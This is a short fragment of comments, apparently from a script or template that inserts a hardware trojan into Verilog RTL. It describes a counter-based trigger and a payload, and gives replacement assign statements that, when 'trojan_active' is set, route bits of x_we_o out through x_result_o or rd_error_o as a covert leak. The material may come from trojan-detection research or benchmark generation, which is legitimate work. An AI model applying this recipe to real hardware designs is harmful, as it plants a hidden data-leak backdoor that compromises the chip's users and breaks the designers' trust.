 ...
 *   
 * Trigger: Counter on x_we_o
 * Payload: Route x_result_o[0] to observable output
 * 
...
//   Find the assign for x_result_o (or rd_error_o as fallback):
//     assign x_result_o = <normal_expr>;
//   Replace with:
//     assign x_result_o = trojan_active ? x_we_o[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? x_we_o[0] : 1'b0;
//
